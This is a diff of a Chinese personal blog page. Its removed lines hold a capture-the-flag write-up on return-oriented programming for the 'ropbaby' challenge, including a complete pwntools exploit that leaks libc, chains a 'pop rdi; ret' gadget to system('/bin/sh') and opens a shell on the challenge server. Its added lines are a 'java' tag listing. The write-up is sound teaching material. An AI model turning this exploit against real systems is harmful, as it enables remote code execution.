@@ -6,20 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>ROP (Return-oriented programming ) 返回导向编程 | 怪咖的小屋</title>
+  <title>Tag: java | 怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
-<meta name="keywords" content="pwn,ROP">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ROP (Return-oriented programming ) 返回导向编程">
-<meta property="og:url" content="http://yoursite.com/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="怪咖的小屋">
+<meta property="og:url" content="http://yoursite.com/tags/java/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
-<meta property="og:description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-09-10T11:02:23.085Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ROP (Return-oriented programming ) 返回导向编程">
-<meta name="twitter:description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
+<meta name="twitter:title" content="怪咖的小屋">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -151,196 +146,69 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ROP (Return-oriented programming ) 返回导向编程" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      ROP (Return-oriented programming ) 返回导向编程
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	
+<a href="/2019/09/10/HashMap源码分析/" class="archive-article-date">
+  	<time datetime="2019-09-10T12:09:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/HashMap源码分析/">HashMap源码分析</a>
     </h1>
   
 
-        
-                <!-- 不蒜子统计 -->        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次        </span>
-<a href="/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="ROP-Return-oriented-programming-返回导向编程"><a href="#ROP-Return-oriented-programming-返回导向编程" class="headerlink" title="ROP (Return-oriented programming ) 返回导向编程"></a>ROP (Return-oriented programming ) 返回导向编程</h3><p><code>ROP(Return Oriented Programming)</code>即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中<strong>已有的小片段(gadgets)</strong>来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。<a id="more"></a></p>
-<p>以<strong>实验吧 ropbaby</strong>为例：<br>![](ROP (Return-oriented programming ) 返回导向编程/d514bf7df4e170521042293fdc69e3d7.png)<br>简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。<br>![](ROP (Return-oriented programming ) 返回导向编程/79671673cb3dbdc18b17630713a6fa10.png)</p>
-<p>那么<strong>利用思路</strong>就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(addr_ret)+p64(‘/bin/sh’)+p64(‘addr_system’)</p>
-<p>在memcpy完想要ret时，会ret到addr_ret的地址，然后将’/bin/sh’pop出来当作参数，在下一个ret时，ret到addr_system这里，因为已经布局好了其参数’/bin/sh’，所以相当于执行system(‘/bin/sh’)，拿到shell.</p>
-<p>首先<strong>寻找溢出点</strong>：<br>![](ROP (Return-oriented programming ) 返回导向编程/ee6566df7256098be4ab03686b8a9c8a.png)<br>经过验证,将nptr复制给savedregs时会发生溢出。<br>接着<strong>查找可控字段，计算偏移量</strong>。<br>![](ROP (Return-oriented programming ) 返回导向编程/bc4a38b47b5fb2858aa7c89ae1d80697.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/c8dbb3b018a921c371b140115253b52f.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/09c4d08f7fb7e50ef331935c777cf403.png)<br>偏移量为8<br>验证如下：<br>![](ROP (Return-oriented programming ) 返回导向编程/d9ce806250e3ab925ac3fbba9336c63a.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/2f1da7027901200e157d3edb9908815f.png)<br><strong>寻找libc中’/bin/sh’的偏移量</strong>(在32位机器上可以找到，我也不知道为什么64位不行)<br>![](ROP (Return-oriented programming ) 返回导向编程/5a73527385c79cd9bcbd0bc832ebaa92.png)<br>offset_binsh = 0x18cd17<br>接着需要<strong>查找所有的 ret</strong>，使用ROPgadget(32位可以，64不知道为什么不行)<br>![](ROP (Return-oriented programming ) 返回导向编程/b476dafead58d72a02f5a03b4ad48d63.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/d7c675fffc61a43ce0238648eb20d885.png)</p>
-<p><strong>注意：</strong>64位参数先以寄存器为主，分别是rdi,rsi,rdx,rcx,r8,r9,栈；32位只有栈。该程序是64位，之后的system(‘/bin/sh’)只有一个参数，入rdi寄存器，所以找相应的指令:pop rdi;ret;</p>
-<p>![](ROP (Return-oriented programming ) 返回导向编程/cdc3b8cb24f2db99e422c98cba4c2cd4.png)<br>那么offset_rdi_ret = 0x21102<br><strong>拿到offset_system</strong><br>![](ROP (Return-oriented programming ) 返回导向编程/638d973dde12d491bf623f5a33a56383.png)<br>利用2可以拿到addr_system，然后addr_libc就可以计算出来了。</p>
-<p><strong>exp如下：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  remote(<span class="string">"106.2.25.7"</span>,  <span class="number">8004</span>)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] Start!'</span></span><br><span class="line">    s.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    <span class="comment">#Get addr_system</span></span><br><span class="line">    s.sendline(<span class="string">'2'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'Enter symbol: '</span>)</span><br><span class="line">    s.sendline(<span class="string">'system'</span>)</span><br><span class="line">    addr_system  =  int  (s.recvuntil(<span class="string">'\n'</span>)[<span class="number">14</span>:],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_system is '</span>,addr_system</span><br><span class="line">    offset_system  =  <span class="number">0x45390</span></span><br><span class="line">    <span class="comment">#Calculate addr_libc</span></span><br><span class="line">    addr_libc  =  addr_system  -  offset_system</span><br><span class="line">    <span class="comment">#Make payload</span></span><br><span class="line">    s.sendline(<span class="string">'3'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'(max 1024): '</span>)</span><br><span class="line">    <span class="comment">#8 + 8 + 8 + 8 =32</span></span><br><span class="line">    s.sendline(<span class="string">'32'</span>)</span><br><span class="line">    offset_binsh  =  <span class="number">0x18cd17</span></span><br><span class="line">    offset_rdi_ret  =  <span class="number">0x21102</span></span><br><span class="line">    addr_rdi_ret  =  addr_libc  +  offset_rdi_ret</span><br><span class="line">    addr_binsh  =  addr_libc  +  offset_binsh</span><br><span class="line"></span><br><span class="line">    payload  =<span class="string">'A'</span>  *  <span class="number">8</span>  +  p64(addr_rdi_ret)  +  p64(addr_binsh)  +  p64(addr_system)</span><br><span class="line"></span><br><span class="line">    s.sendline(payload)</span><br><span class="line">    s.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p><strong>运行结果如下：</strong><br>![1534153380698.png](ROP (Return-oriented programming ) 返回导向编程/af92467f178d1d29a856801aace8c2ef.png)</p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>感觉还不错的话就嘿嘿嘿吧<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/img/alipay.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">HashMap</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">源码</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2019/09/10/Python网络编程/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Python网络编程
-        
-      </div>
-    </a>
   
   
-    <a href="/2019/09/10/ROP之ret2dlresolve/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">ROP之ret2dlresolve</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -374,9 +242,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
